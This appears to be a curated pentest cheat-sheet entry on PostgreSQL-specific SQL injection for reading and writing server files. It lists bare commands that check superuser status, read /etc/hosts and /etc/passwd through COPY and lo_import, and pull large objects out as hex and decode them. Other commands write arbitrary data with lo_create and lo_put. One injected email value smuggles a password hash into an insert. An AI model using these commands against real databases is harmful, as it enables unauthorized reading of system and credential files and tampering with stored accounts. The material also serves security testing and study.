---
technique: "Reading and Writing Files"
family: "injection"
severity_hint: "critical"
tags: []
source: "_raw/Web attacks/Web Attacks/SQLi/PostgreSQL-Specific Techniques/Reading and Writing Files.md"
source_sha256: "d5b2b2df50919e224d28fab1838d205f2e1b0573be8d17395418c6ea04fab35a"
curator_version: 2
...
- `java: SELECT current_setting('is_superuser');`
- `java: bluebird=# CREATE TABLE tmp (t TEXT);`
- `java: COPY tmp FROM '/etc/hosts';`
- `java: bluebird=# COPY tmp FROM '/etc/hosts' DELIMITER E'\x07';`
- `java: bluebird=# CREATE TABLE tmp (t TEXT);`
- `java: SELECT lo_import('/etc/passwd');`
- `java: SELECT lo_get(16513);`
- `java: bluebird=# SELECT data FROM pg_largeobject WHERE loid=16513 AND pageno=0;`
- `java: echo 726f6f743<SNIP> | xxd -r -p`
- `java: SELECT DISTINCT loid FROM pg_largeobject;`
- `java: $split -b 2048 /etc/passwd`
- `java: xxd -ps -c 99999999999 xaa`
- `java: bluebird=# SELECT lo_create(31337);`
- `java: SELECT lo_put(31337, 0, 'this is a test');`
- `java: name=max`
- `java: email=x@x.com','$2a$12$efjEctOv03rB.oskhPzRaO1fJZvBCGXY46nDUkhnwiDwE7tcYTPB2')`
...
## Source
Original note: `_raw/Web attacks/Web Attacks/SQLi/PostgreSQL-Specific Techniques/Reading and Writing Files.md`
